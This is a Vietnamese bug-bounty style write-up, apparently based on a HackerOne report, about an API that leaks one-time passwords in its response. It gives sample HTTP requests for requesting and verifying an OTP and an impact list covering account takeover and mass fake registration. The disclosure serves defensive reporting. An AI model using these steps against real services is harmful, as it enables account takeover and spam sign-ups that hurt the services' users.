# https://hackerone.com/reports/2635315
---

### 💥 **Bối cảnh lỗ hổng**

Một ứng dụng web hoặc mobile thực hiện xác thực bằng OTP (One-Time Password) được gửi đến số điện thoại người dùng. Tuy nhiên, thay vì chỉ gửi OTP qua SMS, **máy chủ lại trả về chính mã OTP đó trong response của API**, làm **vô hiệu hóa hoàn toàn mục tiêu bảo mật của OTP**.

---

### 🔍 **Các bước khai thác (PoC chi tiết)**

1. **Gửi yêu cầu đăng ký hoặc đăng nhập**
   Gửi một request POST đến API xác thực, thường là endpoint như:

   ```
   POST /api/auth/request_otp
   Content-Type: application/json

   {
     "phone_number": "0987654321"
   }
   ```

2. **Quan sát phản hồi API**
   Response trả về sẽ có nội dung như:

   ```json
   {
     "status": "success",
     "otp": "834726",
     "message": "OTP sent successfully to 0987654321"
   }
   ```

   ⚠️ `otp` bị trả về trực tiếp! Không cần kiểm tra điện thoại – hacker đã có OTP trong tay.

3. **Sử dụng OTP để xác thực hoặc đăng ký tài khoản**
   Dùng OTP vừa lấy được để gửi yêu cầu đăng ký hoặc đăng nhập:

   ```
   POST /api/auth/verify_otp
   Content-Type: application/json

   {
     "phone_number": "0987654321",
     "otp": "834726"
   }
   ```

   Nếu thành công, bạn sẽ nhận token truy cập tài khoản.

---

### 🔥 **Impact – Hậu quả có thể xảy ra**

* Đăng ký hoặc chiếm quyền tài khoản **mà không cần thiết bị người dùng**.
* **Tạo tài khoản rác hàng loạt** bằng cách thử nhiều số điện thoại ngẫu nhiên.
* Nếu OTP dùng cho **phục hồi mật khẩu**, kẻ tấn công có thể chiếm tài khoản hợp pháp.
* Hạ uy tín hệ thống xác thực → dễ dàng bị spam, brute-force hoặc takeover.

Có thể đăng ký bằng tài khoản người dùng khác. Có thể đăng nhập vào tài khoản người dùng khác. Một điều nữa tôi nhận thấy là bạn có thể đăng ký bằng bất kỳ số điện thoại 10 chữ số nào vì OTP nằm trong phản hồi để bạn sử dụng, giúp tạo tài khoản rác dễ dàng.
